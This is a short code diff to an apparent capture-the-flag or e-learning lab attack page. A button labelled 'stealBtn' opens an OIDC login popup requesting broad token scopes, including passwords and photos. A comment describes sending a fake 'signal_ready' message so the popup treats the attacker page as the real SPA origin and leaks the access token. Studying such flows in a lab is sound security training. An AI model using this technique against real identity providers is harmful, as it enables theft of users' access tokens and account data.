@@ -28,12 +28,13 @@
       Adjust these parameters to match your challenge environment.
     */
     const spaUrl = `https://sp-elearning.cloud.nds.rub.de/oidc_sp/spa-app/?sp_verifier=spa-v7&sp_id=spa-1`;
+    const loginUrl = `https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml?client_id=spa-1&redirect_uri=https%3A%2F%2Fsp-elearning.cloud.nds.rub.de%3A443%2Foidc_sp%2Fspa%2Fverify&response_mode=web_message&scope=profile+email+calendar+passwords+photos&response_type=token&state=not_relevant_for_this_flow&idp_verifier=spa-a6`;
 
     let popupRef;
 
     document.getElementById("stealBtn").addEventListener("click", () => {
       // 2) Open the legitimate SPA login flow in a popup.
-      popupRef = window.open(spaUrl, "_blank", "width=800,height=600");
+      popupRef = window.open(loginUrl, "_blank", "width=800,height=600");
 
       // 3) After some delay, send a fake "signal_ready" to the popup
       //    telling it that our page is the real SPA origin.
